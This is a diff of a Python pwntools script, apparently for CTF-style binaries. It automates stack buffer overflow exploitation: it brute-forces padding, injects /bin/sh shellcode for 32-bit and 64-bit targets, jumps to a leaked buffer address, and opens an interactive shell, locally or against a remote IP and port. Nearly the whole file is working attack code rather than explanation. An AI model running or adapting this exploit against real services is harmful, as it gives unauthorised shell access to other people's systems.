@@ -1,97 +1,105 @@
 import sys
 from pwn import*
 
-def bit32_exploit(binary_name):
+def binary_exploit(binary_name, exploit_data, binary_data, recv_check):
 
-    shellcode_32bit = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80' # 25bit
-    i = 1
+    	shellcode_32bit = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80' # 25bit
+    	shellcode_64bit = '\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05' #23bit
 
-    while i < 10000:
+    	i = 1
 
-        context.log_level = 'debug'
-        print("roop " , i )
-        p = process('./'+binary_name)
-        p.recvuntil('buf : ')
-        addr = int(p.recv(10),16)
+    	if recv_check == 'yes':
 
-        payload = shellcode_32bit
-        payload += 'A'*i
-        payload += 'B'*4
-        payload += p32(addr)
-        p.sendline(payload)
-        sleep(0.1)
-        
-        try:
-            p.sendline('ls >> output2.txt')
-        
-        except:
-            i += 1
-        else:
-            p.interactive()
-            break
+    		recv_str = raw_input('recv string data : ').rstrip('\n')
+    		newline = raw_input('remove newline ? (yes or no) : ').rstrip('\n')
 
-def bit64_exploit(binary_name):
+    		if newline == 'yes':
+        		recv_str = recv_str.rstrip('\n')
 
-    shellcode_64bit = '\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05' #23bit
-    i = 1
+	if exploit_data == 'local':
 
-    while i < 10000:
+		while i < 10000:
 
-        context.log_level = 'debug'
-        print("roop " , i )
-        p = process('./'+binary_name)
-        p.recvuntil('buf : ')
-        addr = int(p.recv(14),16)
+			context.log_level = 'debug'
+			print("roop " , i )
+			p = process('./'+binary_name)
 
-        payload = shellcode_64bit
-        payload += 'A'*i
-        payload += 'B'*8
-        payload += p64(addr)
-        p.sendline(payload)
-        sleep(0.1)
-        
-        try:
-            p.sendline('ls >> output2.txt')
-        
-        except:
-            i += 1
-        else:
-            p.interactive()
-            break
+			if recv_check == 'yes':
+				p.recvuntil(recv_str)
+		    
+			if binary_data == 32:
+				addr = p32(int(p.recv(10),16))
+				payload = shellcode_32bit
+			elif binary_data == 64:
+				addr = p64(int(p.recv(14),16))
+				payload = shellcode_64bit
+
+			payload += 'A'*i
+			payload += 'B'*4
+			payload += addr
+
+			p.sendline(payload)
+			sleep(0.1)
+		
+			try:
+				p.sendline('ls >> output2.txt')
+		
+			except:
+				i += 1
+			else:
+				p.interactive()
+				break
+
+	elif exploit_data == 'remote':
+
+		ip = raw_input('IP : ').rstrip('\n')
+		port = int(input('PORT : '))
+		
+		while i < 10000:
+
+			context.log_level = 'debug'
+			print("roop " , i )
+			p = process('./'+binary_name)
+
+			if recv_check == 'yes':
+				p.recvuntil(recv_str)
+		    
+			if binary_data == 32:
+				addr = p32(int(p.recv(10),16))
+				payload = shellcode_32bit
+			elif binary_data == 64:
+				addr = p64(int(p.recv(14),16))
+				payload = shellcode_64bit
+			
+
+			payload += 'A'*i
+			payload += 'B'*4
+			payload += addr
+
+			p.sendline(payload)
+			sleep(0.1)
+		
+			try:
+				p.sendline('ls >> output2.txt')
+		
+			except:
+				i += 1
+			else:
+				break
+	
+		r = remote(ip,port)
+	
+		r.sendline(payload)
+		r.interactive()
 
 
-
-memory_protects = ['Canary found', 'NX enabled']
-bit = 0
 
 binary_name = raw_input('binary name : ').rstrip('\n')
-binary_data = int(input('32 biyt or 64 bit : '))
+binary_data = int(input('32 bit or 64 bit : '))
+exploit_data = raw_input('local or remote : ').rstrip('\n')
+recv_check = raw_input('recv str ? (yes or no) : ').rstrip('\n')
 
-print("[+] Checking Banary....")
-os.system('checksec ' + binary_name + ' 2> output.txt')
 
-f = open('output.txt','r')
-lines = f.readlines()
+binary_exploit(binary_name, exploit_data, binary_data, recv_check)
 
-f.close()
 
-for line in lines:
-    print(line)
-
-for memory_protect in memory_protects:
-    for line in lines:
-        if memory_protect in line:
-            print("[-] "+ memory_protect + "....")
-            bit = 1
-
-if bit == 1:
-    sys.exit()
-
-print("[+] not Binary protection")
-print("[+] ok....")
-
-if binary_data == 32:
-    bit32_exploit(binary_name)
-
-else:
-    bit64_exploit(binary_name)
